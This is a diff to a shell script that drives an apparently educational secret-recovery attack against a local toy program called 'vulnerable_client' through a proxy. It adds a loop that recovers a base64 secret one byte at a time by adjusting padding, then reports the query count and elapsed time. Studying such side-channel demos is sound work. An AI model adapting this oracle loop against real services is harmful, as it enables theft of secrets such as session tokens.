@@ -14,13 +14,41 @@ sleep 1
 
 P=ppppppppp
 B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+S=""
+N=0
 
-while true; do
-    if ./vulnerable_client path=$P body=$B >/dev/null; then
-        break
-    fi
+START=$( date +%s )
+
+for i in $( seq 24 1 ); do
+    printf "%02d... " "$i"
+
+    while true; do
+        N=$(( $N + 1 ))
+        if ./vulnerable_client path=$P body=$B >/dev/null; then
+            break
+        fi
+    done
+    C=$( tail -n1 guesses )
+    printf "$C "
+
+    C=$( printf "$C" | tail -c2 )
+    C=$( printf '\x'"$C" )
+    S="$C$S"
+    printf "'$C'\n"
+
+    P="p$P"
+    B=$( printf "$B" | sed s/.// )
 done
-tail -n1 guesses
+
+END=$( date +%s )
+
+echo ""
+echo "$S"
+echo "$S" | base64 -D
+echo ""
+
+echo ""
+echo "Found secret in $N queries and $(( $END - $START )) seconds"
 
 kill $SRV_PID
 kill $PXY_PID
